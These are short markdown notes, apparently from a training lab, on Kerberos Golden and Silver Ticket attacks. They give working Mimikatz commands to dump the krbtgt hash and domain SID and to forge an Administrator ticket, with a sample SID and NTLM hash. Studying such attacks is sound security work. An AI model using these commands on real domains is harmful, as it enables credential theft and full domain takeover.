# Golden/Silver Ticket attack

In order to create a golden ticket, we need the KRBTGT = service account that create TGT with KDC  
In order to create a silver ticket, we only need any accessible account that can log into the desired service

# Golden Ticket
## Dump krbtgt hash w/ Mimikatz
Starts mimikatz : 
```cmd
privilege::debug 
```
ensure this outputs `privilege '20' ok]` 

```cmd
lsadump::lsa /inject /name:krbtgt 
```

- This will dump the hash as well as the security identifier needed to create a Golden Ticket. 
- To create a silver ticket you need to change the /name value to the service you want.

The output will be useful for the next step :
["Mimikatz"](images/mimikatz_lsadump.png)

## CREATE THE GOLDEN TICKET
```cmd
Kerberos::golden /user:Administrator /domain:CONTROLLER.local /sid:S-1-5-21-432953485-3795405108-1502158860 /krbtgt:72cd714611b64cd4d5550cd2759db3f6 /id:500
```

- Administrator : The username
- domain : The domain controller name
- SID : the second part of the first line from the output
- krbtgt : the primary NTLM hash
- id : 500 -> idk what is that

## USE THE GOLDEN TICKET
```cmd 
misc::cmd
```